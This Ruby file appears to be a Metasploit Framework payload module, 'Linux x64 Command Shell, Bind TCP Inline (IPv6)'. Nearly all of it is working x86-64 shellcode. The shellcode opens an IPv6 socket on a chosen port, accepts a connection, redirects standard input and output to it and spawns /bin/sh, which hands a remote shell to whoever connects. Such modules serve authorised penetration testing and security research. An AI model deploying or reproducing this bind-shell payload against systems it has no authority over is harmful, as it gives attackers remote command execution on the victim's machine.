##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 94

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux x64 Command Shell, Bind TCP Inline (IPv6)',
      'Description'   => 'Listen for an IPv6 connection and spawn a command shell',
      'Author'        => 'epi <epibar052[at]gmail.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      ))

    def generate_stage
      # tcp port conversion; shamelessly stolen from linux/x86/shell_reverse_tcp_ipv6.rb
      port_order = ([1,0]) # byte ordering
      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
      tcp_port.pop     # removes the first useless / from  the array
      tcp_port.shift   # removes the last useless  / from  the array
      tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.

      payload = <<-EOS
          socket_call:
            ; int socket(int domain, int type, int protocol)
            push   0x29
            pop    rax                          ; socket syscall
            push   0xa
            pop    rdi                          ; AF_INET6
            push   0x1
            pop    rsi                          ; SOCK_STREAM
            xor    edx,edx                      ; auto-select protocol
            syscall

            push rax
            pop rdi                             ; store socket fd

        populate_sockaddr_in6:
            ; struct sockaddr_in6 {
            ;     sa_family_t     sin6_family;   /* AF_INET6 */
            ;     in_port_t       sin6_port;     /* port number */
            ;     uint32_t        sin6_flowinfo; /* IPv6 flow information */
            ;     struct in6_addr sin6_addr;     /* IPv6 address */
            ;     uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */
            ; };

            ; struct in6_addr {
            ;     unsigned char   s6_addr[16];   /* IPv6 address */
            ; };
            cdq                                 ; zero-out rdx via sign-extension
            push   rdx
            push   rdx
            push   rdx                          ; 24 bytes of sockaddr_in6, all 0x0
            push.i16  0x#{tcp_port}             ; sin6_port
            push.i16  0xa                       ; sin6_family
            push   rsp
            pop    rsi                          ; store pointer to struct

        bind_call:
            ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
            ; rdi -> fd already stored in rdi
            ; rsi -> pointer to sockaddr_in6 struct already in rsi
            push   0x31
            pop    rax                          ; bind syscall
            push   0x1c
            pop    rdx                          ; length of sockaddr_in6 (28)
            syscall

        listen_call:
            ; int listen(int sockfd, int backlog);
            ; rdi -> fd already stored in rdi
            push   0x32
            pop    rax                          ; listen syscall
            push   0x1
            pop    rsi                          ; backlog
            syscall

        accept_call:
            ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
            ; rdi -> fd already stored in rdi
            push   0x2b
            pop    rax                          ; accept syscall
            cdq                                 ; zero-out rdx via sign-extension
            push   rdx
            push   rdx
            push rsp
            pop rsi                             ; when populated, client will be stored in rsi
            push   0x1c
            lea    rdx, [rsp]                   ; pointer to length of rsi (16)
            syscall

        dup2_calls:
            ; int dup2(int oldfd, int newfd);
            xchg    rdi, rax                    ; grab client fd
            push   0x3
            pop    rsi                          ; newfd 

        dup2_loop:
            ; 2 -> 1 -> 0 (3 iterations)
            push   0x21
            pop    rax                          ; dup2 syscall
            dec esi
            syscall 
            loopnz   dup2_loop

        exec_call:
            ; int execve(const char *filename, char *const argv[], char *const envp[]);
            push 0x3b
            pop rax                             ; execve call
            cdq                                 ; zero-out rdx via sign-extension
            mov rbx, '/bin/sh'
            push rbx
            push rsp
            pop rdi                             ; address of /bin/sh
            syscall
      EOS

      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
    end
  end
end
